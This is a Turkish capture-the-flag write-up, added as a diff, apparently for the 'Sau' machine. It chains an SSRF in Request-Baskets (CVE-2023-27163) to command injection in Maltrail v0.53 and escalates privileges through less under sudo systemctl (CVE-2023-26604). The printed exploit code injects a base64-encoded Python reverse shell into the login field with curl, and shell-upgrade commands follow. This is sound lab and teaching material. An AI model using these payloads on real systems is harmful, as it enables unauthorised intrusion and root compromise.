@@ -208,3 +208,154 @@ Bazı hatalar buluyor ama ilginç bir şey yok.
 ![Pasted image 20250111000750.png](/img/user/Pasted%20image%2020250111000750.png)
 
 [[Mediıum Request-Baskets Türkçe\|Mediıum Request-Baskets Türkçe]]
+
+---
+
+**2- Request-Baskets Üzerinde SSRF (CVE-2023–27163)**  
+CVE-2023–27163, Request-Baskets içinde tespit edilen kritik bir **Server-Side Request Forgery (SSRF)** zafiyetidir ve 1.2.1 sürümü dahil tüm versiyonları etkiler. Bu zafiyet, kötü niyetli aktörlerin `/api/baskets/{name}` bileşenini dikkatle hazırlanmış **API request**'leri aracılığıyla istismar ederek yetkisiz ağ kaynaklarına ve hassas bilgilere erişim sağlamasına olanak tanır.
+
+---
+
+#### Exploit
+
+Burada bundan faydalanmak için güzel bir [POC](https://github.com/entr0pie/CVE-2023-27163/blob/main/CVE-2023-27163.sh) var. Port 80'i okumayı denemek için çalıştıracağım:
+
+![Pasted image 20250111002209.png](/img/user/Pasted%20image%2020250111002209.png)
+Sonuçları görmek için ziyaret edebileceğim bir URL veriyor:
+
+http://10.10.11.224:55555/noudql
+
+![Pasted image 20250111002333.png](/img/user/Pasted%20image%2020250111002333.png)
+
+CSS ve resimler yüklenmiyor, ama en azından Mailtrail v0.53 olduğunu görebiliyorum.
+
+![Pasted image 20250111002534.png](/img/user/Pasted%20image%2020250111002534.png)
+
+Aynı şeyi 8338'de de deneyeceğim ve aynı uygulama olduğunu göreceğim.
+
+
+### RCE in Mailtrail
+
+![Pasted image 20250111005703.png](/img/user/Pasted%20image%2020250111005703.png)
+
+#### Identify
+
+“[Mailtrail](https://github.com/spookier/Maltrail-v0.53-Exploit) exploit” araması yapıldığında, ilk olarak Mailtrail v0.53'te kimliği doğrulanmamış bir kod çalıştırma açığı olan bu repo bulunur. Login sayfası username parametresi için girdiyi sterilize etmiyor, bu da OS command injection'a yol açıyor.
+
+
+#### Script Analysis
+
+Bu script, istekte bulunmak için curl'ü çağırmak üzere Python'daki os.system'i kullanarak oldukça acemice  hazırlanmıştır:
+
+```
+def curl_cmd(my_ip, my_port, target_url):
+	
+	payload = f'python3 -c \'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{my_ip}",{my_port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")\''
+	
+	encoded_payload = base64.b64encode(payload.encode()).decode()  # encode the payload in Base64
+	
+	command = f"curl '{target_url}' --data 'username=;`echo+\"{encoded_payload}\"+|+base64+-d+|+sh`'"
+	os.system(command)
+```
+
+Bu, verilen Url artı /login'e basit bir POST isteğidir.
+
+```
+def main():
+	listening_IP = None
+	listening_PORT = None
+	target_URL = None
+
+	if len(sys.argv) != 4:
+		print("Error. Needs listening IP, PORT and target URL.")
+		return(-1)
+	
+	listening_IP = sys.argv[1]
+	listening_PORT = sys.argv[2]
+	target_URL = sys.argv[3] + "/login"
+	print("Running exploit on " + str(target_URL))
+	curl_cmd(listening_IP, listening_PORT, target_URL)
+```
+
+
+#### Exploit
+
+Bunu exploit etmek için, **POC**'yi alacağım ama 28. satırda `/login` eklediği yeri çıkaracağım. Yeni bir **SSRF** URL'si alacağım ve bu URL `/login`'e gidecek.
+
+![Pasted image 20250111010253.png](/img/user/Pasted%20image%2020250111010253.png)
+
+![Pasted image 20250111010408.png](/img/user/Pasted%20image%2020250111010408.png)
+
+![Pasted image 20250111010426.png](/img/user/Pasted%20image%2020250111010426.png)
+
+
+![Pasted image 20250111010444.png](/img/user/Pasted%20image%2020250111010444.png)
+
+Şimdi değiştirilmiş exploit scriptini çalıştıracağım: Çalıştırmadan önce portu dinleyelim . 
+
+![Pasted image 20250111010558.png](/img/user/Pasted%20image%2020250111010558.png)
+
+![Pasted image 20250111010722.png](/img/user/Pasted%20image%2020250111010722.png)
+
+Shell'imı yükseltmek için standart numarayı kullanacağım.
+
+- `script /dev/null -c bash`
+- `^Z` (Ctrl + Z)
+- `stty raw -echo; fg`
+- `nc -lnvp 443`
+- `reset`
+- `Terminal type? screen`
+
+```
+$ script /dev/null -c bash
+Script started, file is /dev/null
+puma@sau:/opt/maltrail$ ^Z
+[1]+  Stopped                 nc -lnvp 443
+oxdf@hacky$ stty raw -echo; fg
+nc -lnvp 443
+            reset
+reset: unknown terminal type unknown
+Terminal type? screen
+puma@sau:/opt/maltrail$ 
+```
+
+Puma kullanıcısının home dizininden user.txt dosyasını alacağım:
+
+![Pasted image 20250111011626.png](/img/user/Pasted%20image%2020250111011626.png)
+
+## Shell as root
+
+### Enumeration
+
+Puma kullanıcısı ==sudo== kullanarak bazı ==systemctl== komutlarını parola olmadan root olarak çalıştırabilir:
+
+**puma** kullanıcısı, **systemctl status trail.service** komutunu şifresiz çalıştırabilir, ancak diğer tüm komutları çalıştırmak için şifre girmesi gerekir.
+
+![Pasted image 20250111011701.png](/img/user/Pasted%20image%2020250111011701.png)
+
+Bu komutu çalıştırmak servisin durumunu yazdırır
+
+`systemctl status trail.service` komutu, **systemd**'yi kullanarak **trail.service** adlı servisin durumunu görüntüler.
+
+Bu komut, aşağıdaki bilgileri sağlar:
+
+- Servisin çalışıp çalışmadığı.
+- Servisin başlatılma durumu (aktif, hata, vb.).
+- Servis ile ilgili log kayıtları ve hata mesajları.
+- Servisin ne zaman başladığı ve son durumu.
+
+![Pasted image 20250111011916.png](/img/user/Pasted%20image%2020250111011916.png)
+
+
+### Exploit Less
+
+
+Çalışan Systemd sürümünü kontrol ettiğimizde bunun Systemd 245 olduğunu görüyoruz. İnternette araştırma yaparken bu versiyonun CVE-2023-26604'e karşı savunmasız olduğunu keşfederiz. Bunu kötüye kullanmak için [exploitation](https://medium.com/@zenmoviefornotification/saidov-maxim-cve-2023-26604-c1232a526ba7) adımlarını açıklayan bu [bağlantıyı](https://nvd.nist.gov/vuln/detail/CVE-2023-26604) buluyoruz.
+
+Terminalin altında metin var ve aslında asılı kalmış. Eğer less komutunda !sh yazarsam, bu sh komutunu çalıştıracak ve bir shell'e düşeceğim.
+
+![Pasted image 20250111013135.png](/img/user/Pasted%20image%2020250111013135.png)
+
+![Pasted image 20250111013115.png](/img/user/Pasted%20image%2020250111013115.png)
+
+![Pasted image 20250111013211.png](/img/user/Pasted%20image%2020250111013211.png)
